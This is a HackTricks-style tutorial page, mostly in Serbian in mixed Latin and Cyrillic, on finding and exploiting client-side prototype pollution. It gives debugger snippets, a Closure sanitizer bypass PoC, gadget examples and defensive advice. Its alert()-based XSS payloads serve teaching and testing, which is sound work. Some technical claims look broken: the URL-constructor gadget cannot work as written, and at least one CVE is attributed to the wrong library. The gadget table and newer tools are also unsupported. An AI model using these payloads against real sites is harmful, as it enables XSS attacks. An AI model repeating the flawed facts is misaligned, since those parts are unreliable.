# Klijentska strana zagađenja prototipa

{{#include ../../../banners/hacktricks-training.md}}

## Otkriće korišćenjem automatskih alata

Alati [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **i** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) mogu se koristiti za **pronalazak ranjivosti na zagađenje prototipa**.

Pored toga, možete koristiti i **proširenje za pregledač** [**PPScan**](https://github.com/msrkp/PPScan) da **automatski** **skenirate** **stranice** koje **pristupate** za ranjivosti na zagađenje prototipa.

### Debagovanje gde se svojstvo koristi <a href="#id-5530" id="id-5530"></a>
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
__proto__: null,
get() {
console.trace()
return "test"
},
})
```
### Pronalaženje uzroka zagađenja prototipa <a href="#id-5530" id="id-5530"></a>

Kada je ranjivost zagađenja prototipa identifikovana pomoću bilo kog alata, i ako kod nije previše složen, možete pronaći ranjivost pretražujući ključne reči kao što su `location.hash`, `decodeURIComponent` ili `location.search` u Chrome Developer Tools. Ovaj pristup vam omogućava da precizno odredite ranjivi deo JavaScript koda.

Za veće i složenije kodne baze, jednostavan metod za otkrivanje ranjivog koda uključuje sledeće korake:

1. Koristite alat za identifikaciju ranjivosti i dobijanje payload-a dizajniranog da postavi svojstvo u konstruktoru. Primer koji pruža ppmap može izgledati ovako: `constructor[prototype][ppmap]=reserved`.
2. Postavite breakpoint na prvu liniju JavaScript koda koja će se izvršiti na stranici. Osvežite stranicu sa payload-om, pauzirajući izvršenje na ovom breakpoint-u.
3. Dok je izvršenje JavaScript-a pauzirano, izvršite sledeći skript u JS konzoli. Ovaj skript će signalizirati kada je 'ppmap' svojstvo kreirano, pomažući u lociranju njegovog porekla:
```javascript
function debugAccess(obj, prop, debugGet = true) {
var origValue = obj[prop]

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet) debugger
return origValue
},
set: function (val) {
debugger
origValue = val
},
})
}

debugAccess(Object.prototype, "ppmap")
```
4. Vratite se na karticu **Sources** i izaberite “Resume script execution”. JavaScript će nastaviti sa izvršavanjem, a 'ppmap' svojstvo će biti zagađeno kao što se očekuje. Korišćenje datog snippeta olakšava identifikaciju tačne lokacije gde je 'ppmap' svojstvo zagađeno. Istražujući **Call Stack**, mogu se posmatrati različiti stekovi gde je došlo do zagađenja.

Kada odlučujete koji stek da istražite, često je korisno ciljati stekove povezane sa JavaScript bibliotečkim datotekama, jer se zagađenje prototipa često dešava unutar ovih biblioteka. Identifikujte relevantan stek ispitivanjem njegove povezanosti sa bibliotečkim datotekama (vidljivo sa desne strane, slično slici koja je data kao vodič). U scenarijima sa više stekova, kao što su oni na linijama 4 i 6, logičan izbor je stek na liniji 4, jer predstavlja početno zagađenje i time korenski uzrok ranjivosti. Klikom na stek bićete preusmereni na ranjivi kod.

![https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Pronalaženje Script Gadgets

Gadget je **kod koji će biti zloupotrebljen kada se otkrije PP ranjivost**.

Ako je aplikacija jednostavna, možemo **pretraživati** za **ključnim rečima** kao što su **`srcdoc/innerHTML/iframe/createElement`** i pregledati izvorni kod i proveriti da li **dovodi do izvršavanja javascripta**. Ponekad, pomenute tehnike možda uopšte ne pronađu gadgete. U tom slučaju, čisti pregled izvornog koda otkriva neke lepe gadgete kao što je donji primer.

### Primer pronalaženja PP gadgeta u kodu Mithil biblioteke

Proverite ovaj writeup: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Rekompilacija payload-a za ranjive biblioteke

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Bypass HTML sanitizera putem PP

[**Ova istraživanja**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) prikazuje PP gadgete koji se koriste za **obići sanitizacije** koje pružaju neke biblioteke HTML sanitizera:

- **sanitize-html**

<figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

- **dompurify**

<figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

- **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Нови алати и аутоматизација (2023–2025)

* **Burp Suite DOM Invader (v2023.6)** – PortSwigger је додао посебан *Prototype-pollution* таб који аутоматски мења имена параметара (нпр. `__proto__`, `constructor.prototype`) и детектује контаминиране особине на sink тачкама унутар браузер екстензије. Када се активира gadget, DOM Invader приказује стек извршења и тачну линију где је особина била dereferencirana, чинећи ручно ловљење breakpoint-а непотребним. Комбинујте га са "Break on property access" фрагментом већ приказаним изнад да бисте брзо прешли са *source → sink*.
* **protoStalker** – отворени изворни Chrome DevTools додатак (објављен 2024) који визуализује прототипске ланце у реалном времену и означава уписе у глобално опасне кључеве као што су `onerror`, `innerHTML`, `srcdoc`, `id`, итд. Корисно када имате само производни пакет и не можете да инструментујете корак изградње.
* **ppfuzz 2.0 (2025)** – алат сада подржава ES-модуле, HTTP/2 и WebSocket крајње тачке. Нови `-A browser` режим покреће headless Chromium инстанцу и аутоматски набраја gadget класе бруталним тестирањем DOM API-ја (види одељак испод).

---

## Недавна истраживања о Prototype-Pollution Gadget-има (2022–2025)

Средином 2023. PortSwigger истраживачи су објавили рад који показује да се *браузерски уграђени* објекти могу претворити у поуздане XSS gadget-е када су контаминирани. Пошто су ови објекти присутни на **свакој** страници, можете добити извршење чак и ако код циљне апликације никада не додирује контаминирану особину.

Пример gadget-а (ради у свим evergreen браузерима ≥ 2023-04):
```html
<script>
// Source (e.g. https://victim/?__proto__[href]=javascript:alert(document.domain))
// For demo we just pollute manually:
Object.prototype.href = 'javascript:alert(`polluted`)' ;

// Sink – URL() constructor implicitly reads `href`
new URL('#'); // breaks into JS; in Chrome you get an alert, Firefox loads "javascript:" URL
</script>
```
Other useful global gadgets that have been confirmed to work after pollution (tested 2024-11):

| Gadget class | Read property | Primitive achieved |
|--------------|---------------|--------------------|
| `Notification` | `title` | `alert()` putem klika na obaveštenje |
| `Worker` | `name` | JS izvršavanje u posvećenom Worker-u |
| `Image` | `src` | Tradicionalni `onerror` XSS |
| `URLSearchParams` | `toString` | DOM-bazirani Open Redirect |

See the PortSwigger paper for the full list of 11 gadgets and a discussion about sandbox escapes.

---

## Notable Client-Side PP CVEs (2023-2025)

* **DOMPurify ≤ 3.0.8 – CVE-2024-45801**  Napadač bi mogao da zagađuje `Node.prototype.after` pre nego što se sanitizator inicijalizuje, zaobilazeći *SAFE_FOR_TEMPLATES* profil i dovodeći do skladištenog XSS-a.  Dobavljač je ispravio korišćenjem `Object.hasOwn()` provere i `Object.create(null)` za interne mape.
* **jQuery 3.6.0-3.6.3 – CVE-2023-26136 / CVE-2023-26140**  `extend()` bi mogao da se koristi na kreiranim objektima koji potiču iz `location.hash`, uvodeći proizvoljna svojstva u `Object.prototype` u kontekstu pretraživača.
* **sanitize-html < 2.8.1 (2023-10) prototipsko zagađenje**  Zlonamerna lista atributa kao što je `{"__proto__":{"innerHTML":"<img/src/onerror=alert(1)>"}}` zaobišla je dozvoljenu listu.

Čak i ako ranjiva biblioteka živi **samo na klijentu**, rezultantni XSS je i dalje moguće iskoristiti na daljinu putem reflektovanih parametara, postMessage handler-a ili skladištenih podataka koji se kasnije prikazuju.

---

## Modern Defensive Measures

1. **Zamrzni globalni prototip rano** (idealno kao prvi skript):
```javascript
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Map.prototype);
```
Budite svesni da ovo može pokvariti polyfills koji se oslanjaju na kasnu ekstenziju.
2. Koristite `structuredClone()` umesto `JSON.parse(JSON.stringify(obj))` ili zajedničkih "deepMerge" snippeta – ignoriše settere/gettere i ne prolazi kroz prototipski lanac.
3. Kada vam zaista zatreba funkcionalnost dubokog spajanja, izaberite **lodash ≥ 4.17.22** ili **deepmerge ≥ 5.3.0** koji imaju ugrađenu sanitaciju prototipa.
4. Dodajte Content-Security-Policy sa `script-src 'self'` i strogim nonce-om.  Dok CSP neće zaustaviti sve gadgete (npr. `location` manipulaciju), blokira većinu `innerHTML` odredišta.


## References

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
- [https://portswigger.net/research/widespread-prototype-pollution-gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/](https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/)




- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{{#include ../../../banners/hacktricks-training.md}}
